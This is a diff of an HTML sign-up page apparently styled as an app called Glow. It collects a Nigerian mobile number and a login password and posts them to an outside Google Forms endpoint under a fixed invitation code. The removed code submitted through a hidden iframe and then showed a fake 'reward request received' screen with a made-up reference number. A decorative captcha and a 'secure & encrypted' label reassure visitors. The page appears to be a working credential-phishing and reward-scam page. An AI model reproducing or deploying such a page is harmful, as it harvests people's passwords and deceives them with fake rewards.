@@ -5,11 +5,10 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
   <meta name="format-detection" content="telephone=no, email=no" />
-  <title>Application submitted · Glow</title>
+  <title>Register</title>
   <link rel="preconnect" href="https://i.postimg.cc" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
-    /* ---------- global reset / same base ---------- */
     :root {
       --primary: #ef4444;
       --primary-pressed: #dc2626;
@@ -17,29 +16,24 @@
       --muted: #d1d5db;
       --border: rgba(255, 255, 255, 0.2);
       --card: rgba(0, 0, 0, 0.3);
-      --success: #10b981;
-    }
-    
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
     }
     
     html, body {
       height: 100%;
+      margin: 0;
+      padding: 0;
       font-family: 'Tajawal', sans-serif;
       color: var(--text);
       overflow-x: hidden;
     }
     
-    /* same background + overlay */
+    /* Background with the provided image */
     body {
       background: url('https://i.postimg.cc/DZ540xrb/BACKGROUND-41af007b.png') no-repeat center center fixed;
       background-size: cover;
-      position: relative;
     }
     
+    /* Dark overlay for better readability */
     body::after {
       content: '';
       position: fixed;
@@ -57,7 +51,6 @@
       flex-direction: column;
     }
     
-    /* --- top bar (identical to register, but subtle) --- */
     .nav {
       position: sticky;
       top: 0;
@@ -68,7 +61,6 @@
       justify-content: space-between;
       padding: 0 12px;
       background: transparent;
-      backdrop-filter: blur(4px);
     }
     
     .nav .left, .nav .right {
@@ -82,8 +74,6 @@
       background: transparent;
       border: none;
       font-size: 18px;
-      opacity: 0.9;
-      cursor: default;  /* non-interactive on confirmation */
     }
     
     .scroll {
@@ -100,214 +90,128 @@
       filter: drop-shadow(0 2px 8px rgba(0,0,0,0.3));
     }
     
-    /* ---------- CONFIRMATION CARD (very sleek) ---------- */
-    .confirm-card {
+    .card {
       width: 100%;
-      max-width: 480px;
+      max-width: 460px;
       background: var(--card);
-      backdrop-filter: blur(14px);
-      -webkit-backdrop-filter: blur(14px);
       border: 1px solid var(--border);
-      border-radius: 32px;
-      box-shadow: 0 25px 50px -8px rgba(0,0,0,0.4), 0 0 0 1px rgba(255,255,255,0.05) inset;
-      padding: 40px 28px;
-      text-align: center;
-      transition: all 0.3s ease;
-      animation: fadeSlide 0.5s cubic-bezier(0.16, 1, 0.3, 1);
-    }
-    
-    @keyframes fadeSlide {
-      0% { opacity: 0; transform: translateY(12px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
-    
-    /* success icon / emblem */
-    .success-ring {
-      width: 88px;
-      height: 88px;
-      margin: 0 auto 20px;
-      background: rgba(16, 185, 129, 0.15);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border: 2px solid rgba(16, 185, 129, 0.3);
-      box-shadow: 0 0 0 8px rgba(16, 185, 129, 0.05);
-    }
-    
-    .check-svg {
-      width: 48px;
-      height: 48px;
-      fill: none;
-      stroke: #10b981;
-      stroke-width: 3;
-      stroke-linecap: round;
-      stroke-linejoin: round;
-      filter: drop-shadow(0 4px 8px rgba(16,185,129,0.4));
-    }
-    
-    .confirm-card h2 {
-      font-size: 28px;
-      font-weight: 700;
-      letter-spacing: -0.01em;
-      background: linear-gradient(to right, #fff, #e0e7ff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      margin-bottom: 12px;
-    }
-    
-    .confirm-card .badge {
-      background: rgba(239, 68, 68, 0.2);
-      backdrop-filter: blur(4px);
-      border: 1px solid rgba(239, 68, 68, 0.3);
-      color: #fff;
-      font-size: 14px;
-      font-weight: 500;
-      padding: 6px 16px;
-      border-radius: 40px;
-      display: inline-block;
-      margin-bottom: 22px;
-      letter-spacing: 0.3px;
-    }
-    
-    .greeting {
-      font-size: 18px;
-      font-weight: 400;
-      color: #e5e7eb;
-      margin-bottom: 28px;
-      line-height: 1.5;
-      max-width: 340px;
-      margin-left: auto;
-      margin-right: auto;
-    }
-    
-    .greeting strong {
-      color: white;
-      font-weight: 600;
-      background: linear-gradient(145deg, #fff, #f3f4f6);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    
-    .highlight-message {
-      background: rgba(255, 255, 255, 0.03);
-      border-radius: 24px;
-      padding: 24px 18px;
-      border: 1px solid rgba(255,255,255,0.05);
-      margin: 20px 0 28px;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+      padding: 24px 20px 28px;
       backdrop-filter: blur(8px);
-      text-align: left;
     }
     
-    .highlight-message p {
+    .field {
       display: flex;
       align-items: center;
-      gap: 14px;
-      font-size: 17px;
-      color: #f0f0f0;
-      font-weight: 400;
-      margin: 14px 0;
+      gap: 12px;
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 12px 16px;
+      background: rgba(255, 255, 255, 0.1);
+      margin-top: 16px;
     }
     
-    .highlight-message p:first-child {
+    .field:first-child {
       margin-top: 0;
     }
     
-    .highlight-message p:last-child {
-      margin-bottom: 0;
+    .field:focus-within {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.3);
     }
     
-    .icon-small {
-      width: 28px;
+    .cc-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 46px;
       height: 28px;
-      background: rgba(239, 68, 68, 0.2);
-      border-radius: 50%;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 14px;
-      color: #ef4444;
-      border: 1px solid rgba(239,68,68,0.4);
-    }
-    
-    .divider {
-      width: 100%;
-      height: 1px;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
-      margin: 28px 0 24px;
-    }
-    
-    .eta-note {
-      background: rgba(0, 0, 0, 0.2);
-      border-radius: 60px;
-      padding: 10px 22px;
-      font-size: 15px;
-      font-weight: 500;
-      border: 1px solid rgba(255,215,0,0.2);
-      color: #ffde7a;
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 16px;
-    }
-    
-    .eta-note span {
-      font-size: 18px;
-    }
-    
-    .btn-confirm {
-      background: rgba(255,255,255,0.05);
+      padding: 0 8px;
+      border-radius: 999px;
+      background: rgba(255, 255, 255, 0.1);
       border: 1px solid var(--border);
-      color: white;
-      font-size: 17px;
-      font-weight: 500;
-      padding: 16px 32px;
-      border-radius: 60px;
-      width: 100%;
-      cursor: default;  /* not interactive, just for looks */
-      backdrop-filter: blur(8px);
-      transition: 0.2s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      letter-spacing: 0.3px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+      color: var(--text);
     }
     
-    .btn-confirm .arrow {
+    input {
+      border: 0;
+      outline: 0;
+      font-size: 15px;
+      flex: 1;
+      background: transparent;
+      color: var(--text);
+    }
+    
+    input::placeholder {
+      color: var(--muted);
       opacity: 0.7;
-      font-size: 20px;
     }
     
-    .footer-note {
+    .help {
+      margin-top: 8px;
+      font-size: 13px;
+      color: var(--muted);
+      padding-left: 8px;
+    }
+    
+    .actions {
+      padding: 24px 2px 0;
+    }
+    
+    .btn {
+      width: 100%;
+      border-radius: 999px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 600;
+      border: 0;
+      cursor: pointer;
+      display: block;
+      transition: all 0.3s ease;
+    }
+    
+    .btn-primary {
+      background: var(--primary);
+      color: #fff;
+      box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
+    }
+    
+    .btn-primary:hover {
+      background: var(--primary-pressed);
+    }
+    
+    .btn-plain {
+      margin-top: 12px;
+      background: rgba(255, 255, 255, 0.1);
+      color: var(--text);
+      border: 1px solid var(--border);
+    }
+    
+    .btn-plain:hover {
+      background: rgba(255, 255, 255, 0.2);
+    }
+    
+    .footer {
       max-width: 460px;
       width: 100%;
-      margin: 26px auto 0;
-      color: var(--muted);
+      margin: 16px auto 0;
+      color: var(--text);
+      display: flex;
+      justify-content: space-between;
       font-size: 14px;
-      text-align: center;
-      opacity: 0.7;
     }
     
-    .footer-note a {
+    .footer a {
       color: var(--primary);
       text-decoration: none;
       font-weight: 500;
-      border-bottom: 1px dotted rgba(239,68,68,0.4);
     }
     
-    .footer-note a:hover {
-      border-bottom-color: white;
+    .footer a:hover {
+      text-decoration: underline;
     }
     
-    /* hide register form after submit? we will replace content */
-    .hidden {
-      display: none !important;
-    }
-    
-    /* toast (copy style) */
     .toast {
       position: fixed;
       left: 50%;
@@ -323,136 +227,92 @@
       z-index: 100;
     }
     
-    /* responsive */
+    /* Captcha styling */
+    .captcha {
+      cursor: pointer;
+      border-radius: 8px;
+      overflow: hidden;
+      background: rgba(255,255,255,0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 112px;
+      height: 31px;
+    }
+    
+    .captcha canvas {
+      border-radius: 8px;
+    }
+    
+    /* Responsive adjustments */
     @media (max-width: 480px) {
-      .confirm-card {
-        padding: 32px 18px;
-        border-radius: 28px;
+      .card {
+        padding: 20px 16px 24px;
       }
-      .success-ring {
-        width: 72px;
-        height: 72px;
+      
+      .field {
+        padding: 10px 14px;
       }
-      .check-svg {
-        width: 40px;
-        height: 40px;
-      }
-      .confirm-card h2 {
-        font-size: 24px;
-      }
-      .greeting {
-        font-size: 16px;
+      
+      .btn {
+        padding: 14px;
       }
     }
   </style>
 </head>
 <body>
   <div class="page">
-    <!-- same minimal header (now purely aesthetic) -->
     <header class="nav">
       <div class="left"><button type="button">←</button></div>
       <div class="title"></div>
       <div class="right"><button type="button">EN</button></div>
     </header>
 
-    <main class="scroll" id="mainContent">
-      <!-- LOGO same -->
+    <main class="scroll">
       <img class="logo" alt="Logo" src="https://i.postimg.cc/wjrLz46f/logo-en-US.png" />
 
-      <!-- REGISTER CARD (initially visible) -->
-      <div id="registerCardContainer" style="width:100%; display:flex; justify-content:center;">
-        <form id="registerForm" class="card"
-              action="https://docs.google.com/forms/d/e/1FAIpQLSersIOADeAL4zZ7H7_yfDKyGlPb4lkpMkXANJbTmHzCAtTXnA/formResponse"
-              method="POST" target="_self" style="max-width:460px;">
+      <!-- form linked to Google Form -->
+      <form id="registerForm" class="card"
+            action="https://docs.google.com/forms/d/e/1FAIpQLSersIOADeAL4zZ7H7_yfDKyGlPb4lkpMkXANJbTmHzCAtTXnA/formResponse"
+            method="POST" target="_self">
 
-          <!-- Phone (entry.11026931) -->
-          <div class="field">
-            <span class="cc-badge">+234</span>
-            <input id="phone" name="entry.11026931" type="tel" placeholder="Please enter your mobile number" required/>
-          </div>
-
-          <!-- Password (entry.70675987) -->
-          <div class="field">
-            <input id="password" name="entry.70675987" type="password" placeholder="Please enter your login password" required minlength="6"/>
-          </div>
-
-          <!-- Confirm Password (entry.2139866834) -->
-          <div class="field">
-            <input id="confirm" name="entry.2139866834" type="password" placeholder="Please confirm your password" required minlength="6"/>
-          </div>
-
-          <!-- Captcha (not sent) -->
-          <div class="field">
-            <input id="captchaInput" type="text" placeholder="Please enter the verification code" required/>
-            <div class="captcha"><canvas id="captchaCanvas" width="112" height="31"></canvas></div>
-          </div>
-          <div class="help">Enter the 3-digit verification code</div>
-
-          <!-- Invitation Code fixed -->
-          <div class="field">
-            <input id="invite" name="entry.1944770665" type="text" value="6976367" readonly/>
-          </div>
-
-          <div class="actions">
-            <button class="btn btn-primary" type="submit" id="registerBtn">Register Now</button>
-            <button class="btn btn-plain" type="button" id="downloadBtn">Already have an account? Download the app</button>
-          </div>
-        </form>
-      </div>
-
-      <!-- CONFIRMATION CARD (hidden initially) -->
-      <div id="confirmationContainer" style="width:100%; display:none; justify-content:center;">
-        <div class="confirm-card">
-          <!-- subtle animated ring -->
-          <div class="success-ring">
-            <svg class="check-svg" viewBox="0 0 24 24">
-              <polyline points="20 6 9 17 4 12" stroke="currentColor" stroke-width="2.5"/>
-            </svg>
-          </div>
-          
-          <h2>Reward request received</h2>
-          <div class="badge">✨ priority processing ✨</div>
-          
-          <div class="greeting">
-            Thank you, <strong>valued member</strong>.<br>Your application for the bonus is being reviewed.
-          </div>
-          
-          <div class="highlight-message">
-            <p>
-              <span class="icon-small">✓</span>
-              <span><strong>Sign-up bonus</strong> · entry confirmed</span>
-            </p>
-            <p>
-              <span class="icon-small">⏳</span>
-              <span>Exclusive reward tier · pending</span>
-            </p>
-            <p>
-              <span class="icon-small">📬</span>
-              <span>Details will be sent via SMS & email</span>
-            </p>
-          </div>
-          
-          <div class="eta-note">
-            <span>⚡</span> within 2–4 hours (usually faster)
-          </div>
-          
-          <!-- sleek non-clickable element (looks like a button) -->
-          <div class="btn-confirm">
-            <span>✔</span> submission complete <span class="arrow">→</span>
-          </div>
-          
-          <div class="divider"></div>
-          
-          <div style="font-size:15px; color:#cbd5e1;">
-            Keep an eye on your inbox — we’ll send the reward instructions shortly.
-          </div>
+        <!-- Phone (entry.11026931) -->
+        <div class="field">
+          <span class="cc-badge">+234</span>
+          <input id="phone" name="entry.11026931" type="tel" placeholder="Please enter your mobile number" required/>
         </div>
-      </div>
 
-      <!-- footer remains (adapt slightly) -->
-      <div class="footer" id="footerNote" style="justify-content:center; gap:20px;">
-        <span>✔ secure & encrypted</span>
-        <a href="#" id="supportLink" style="color:#ef4444;">support</a>
+        <!-- Password (entry.70675987) -->
+        <div class="field">
+          <input id="password" name="entry.70675987" type="password" placeholder="Please enter your login password" required minlength="6"/>
+        </div>
+
+        <!-- Confirm Password (entry.2139866834) -->
+        <div class="field">
+          <input id="confirm" name="entry.2139866834" type="password" placeholder="Please confirm your password" required minlength="6"/>
+        </div>
+
+        <!-- Captcha (not sent to Google, just validation) -->
+        <div class="field">
+          <input id="captchaInput" type="text" placeholder="Please enter the verification code" required/>
+          <div class="captcha"><canvas id="captchaCanvas" width="112" height="31"></canvas></div>
+        </div>
+        <div class="help">Enter the 3-digit verification code</div>
+
+        <!-- Invitation Code fixed (entry.1944770665) -->
+        <div class="field">
+          <input id="invite" name="entry.1944770665" type="text" value="6976367" readonly/>
+        </div>
+
+        <div class="actions">
+          <button class="btn btn-primary" type="submit">Register Now</button>
+          <button class="btn btn-plain" type="button" id="downloadBtn">Already have an account? Download the app</button>
+        </div>
+      </form>
+
+      <div class="footer">
+        <span>Have an account?</span>
+        <a id="loginLink" href="#">Log in</a>
       </div>
     </main>
   </div>
@@ -460,141 +320,82 @@
   <div class="toast" id="toast"></div>
 
   <script>
-    (function() {
-      // ------ toast helper ------
-      const toastEl = document.getElementById('toast');
-      function showToast(msg) {
-        toastEl.textContent = msg;
-        toastEl.style.display = 'block';
-        setTimeout(() => {
-          toastEl.style.display = 'none';
-        }, 2000);
-      }
+    // Toast notification
+    const toastEl = document.getElementById('toast');
+    function toast(msg) {
+      toastEl.textContent = msg;
+      toastEl.style.display = 'block';
+      setTimeout(() => {
+        toastEl.style.display = 'none';
+      }, 2000);
+    }
 
-      // ------ captcha (exactly same as original) ------
-      const canvas = document.getElementById('captchaCanvas');
-      const ctx = canvas.getContext('2d');
-      let captchaText = '';
-
-      function generateCaptcha() {
-        captchaText = Math.floor(100 + Math.random() * 900).toString();
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = 'rgba(255, 255, 255, 0.1)';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = '#ffffff';
-        ctx.font = 'bold 24px Arial';
-        ctx.textAlign = 'center';
-        ctx.textBaseline = 'middle';
-        ctx.fillText(captchaText, canvas.width/2, canvas.height/2);
-        for(let i = 0; i < 20; i++) {
-          ctx.strokeStyle = `rgba(255, 255, 255, ${Math.random() * 0.3})`;
-          ctx.beginPath();
-          ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
-          ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
-          ctx.stroke();
-        }
-      }
-      generateCaptcha();
-      document.querySelector('.captcha').addEventListener('click', generateCaptcha);
-
-      // ------ DOM elements ------
-      const registerForm = document.getElementById('registerForm');
-      const registerCardDiv = document.getElementById('registerCardContainer');
-      const confirmationDiv = document.getElementById('confirmationContainer');
-      const footerNote = document.getElementById('footerNote');
-
-      // ------ intercept form submission ------
-      registerForm.addEventListener('submit', function(e) {
-        e.preventDefault();   // we control validation and then swap UI
-
-        const pwd = document.getElementById('password').value;
-        const conf = document.getElementById('confirm').value;
-        const userCaptcha = document.getElementById('captchaInput').value.trim();
-
-        // basic validation
-        if (pwd !== conf) {
-          showToast('Passwords do not match.');
-          return;
-        }
-        if (userCaptcha !== captchaText) {
-          showToast('Incorrect verification code.');
-          generateCaptcha();
-          return;
-        }
-
-        // optional: actually send data to google forms in background?
-        // since original used target="_self", but we want to stay on page.
-        // we can still send silently using fetch or keep _self but we'll 
-        // mimic the same behaviour: normally it would redirect, but we replace UI.
-        // we'll submit the form to a hidden iframe to avoid page refresh.
-        
-        const hiddenIframe = document.createElement('iframe');
-        hiddenIframe.name = 'hiddenIframe';
-        hiddenIframe.style.display = 'none';
-        document.body.appendChild(hiddenIframe);
-        
-        // set target to iframe and submit
-        registerForm.target = 'hiddenIframe';
-        registerForm.submit();
-
-        // after 300ms (to make it smooth) switch to confirmation card
-        setTimeout(() => {
-          // hide register, show confirmation
-          registerCardDiv.style.display = 'none';
-          confirmationDiv.style.display = 'flex';  // flex to center
-          
-          // update footer text to look more "confirmation"
-          footerNote.innerHTML = `
-            <span style="opacity:0.7;">reference · #TR-${Math.floor(1000 + Math.random()*9000)}</span>
-            <a href="#" id="fakeSupport" style="color:#ef4444;">notification</a>
-          `;
-          
-          // attach dummy event to support link
-          document.getElementById('fakeSupport')?.addEventListener('click', (ev) => {
-            ev.preventDefault();
-            showToast('✨ reward team will contact you soon');
-          });
-          
-          // also handle any leftover nav buttons (just make them non-redirecting)
-        }, 200);
-
-        // clean iframe after some time (optional)
-        setTimeout(() => {
-          if (hiddenIframe.parentNode) hiddenIframe.parentNode.removeChild(hiddenIframe);
-        }, 5000);
-      });
-
-      // Make back button / EN purely aesthetic (no action)
-      document.querySelectorAll('.nav button').forEach(btn => {
-        btn.addEventListener('click', (e) => {
-          e.preventDefault();
-          // gentle toast to indicate it's just a demo
-          showToast('🪄 confirmation screen (demo)');
-        });
-      });
-
-      // handle "Already have an account?" and "Log in" (from original)
-      document.getElementById('downloadBtn')?.addEventListener('click', function() {
-        showToast('Please complete registration first');
-      });
+    // Simple 3-digit captcha
+    const canvas = document.getElementById('captchaCanvas');
+    const ctx = canvas.getContext('2d');
+    let captchaText = '';
+    
+    function generateCaptcha() {
+      // Generate 3 random digits
+      captchaText = Math.floor(100 + Math.random() * 900).toString();
       
-      const loginLink = document.getElementById('loginLink');
-      if (loginLink) {
-        loginLink.addEventListener('click', function(e) {
-          e.preventDefault();
-          showToast('You must register an account first.');
-        });
+      // Clear canvas
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      
+      // Draw background
+      ctx.fillStyle = 'rgba(255, 255, 255, 0.1)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      
+      // Draw text
+      ctx.fillStyle = '#ffffff';
+      ctx.font = 'bold 24px Arial';
+      ctx.textAlign = 'center';
+      ctx.textBaseline = 'middle';
+      ctx.fillText(captchaText, canvas.width/2, canvas.height/2);
+      
+      // Add some noise
+      for(let i = 0; i < 20; i++) {
+        ctx.strokeStyle = `rgba(255, 255, 255, ${Math.random() * 0.3})`;
+        ctx.beginPath();
+        ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
+        ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+        ctx.stroke();
       }
+    }
+    
+    // Initialize captcha
+    generateCaptcha();
+    
+    // Refresh captcha on click
+    document.querySelector('.captcha').addEventListener('click', generateCaptcha);
 
-      // support link in footer (original)
-      const supportLink = document.getElementById('supportLink');
-      if (supportLink) {
-        supportLink.addEventListener('click', (e) => {
-          e.preventDefault();
-          showToast('✉️ support@example.com');
-        });
+    // validate before submit
+    const form = document.getElementById('registerForm');
+    form.addEventListener('submit', function(e) {
+      const pwd = document.getElementById('password').value;
+      const conf = document.getElementById('confirm').value;
+      const userCaptcha = document.getElementById('captchaInput').value.trim();
+      
+      if (pwd !== conf) { 
+        e.preventDefault(); 
+        toast('Passwords do not match.'); 
+        return;
       }
-    })();
+      
+      if (userCaptcha !== captchaText) { 
+        e.preventDefault(); 
+        toast('Incorrect verification code.'); 
+        generateCaptcha(); 
+        return;
+      }
+    });
+    
+    // Handle login link click
+    document.getElementById('loginLink').addEventListener('click', function(e) {
+      e.preventDefault();
+      toast('You must register an account first.');
+    });
   </script>
 </body>
+
 </html>
